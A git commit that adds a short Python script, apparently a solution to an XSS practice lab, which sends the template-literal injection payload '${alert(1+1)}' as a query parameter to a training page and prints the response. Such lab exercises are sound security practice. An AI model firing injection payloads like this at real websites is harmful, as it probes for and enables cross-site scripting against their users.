b17a3c70b1b8d2e1d45fd626a69d9f96e1890856
Nguyen Diep Anh <102238853+Weep2609@users.noreply.github.com>
2023-02-27 23:39:39 +0700

    Create exercise_20.py

---
+++ brutelogic_lab/exercise_20.py
@@ -0,0 +1,13 @@
+#!/usr/bin/python3
+import requests
+
+url = 'https://brutelogic.com.br/gym.php'
+
+payload = '${alert(1+1)}'
+
+params = {'p20': payload}
+
+r = requests.get(url, params=params)
+
+print(r.text)
+print(r.url)
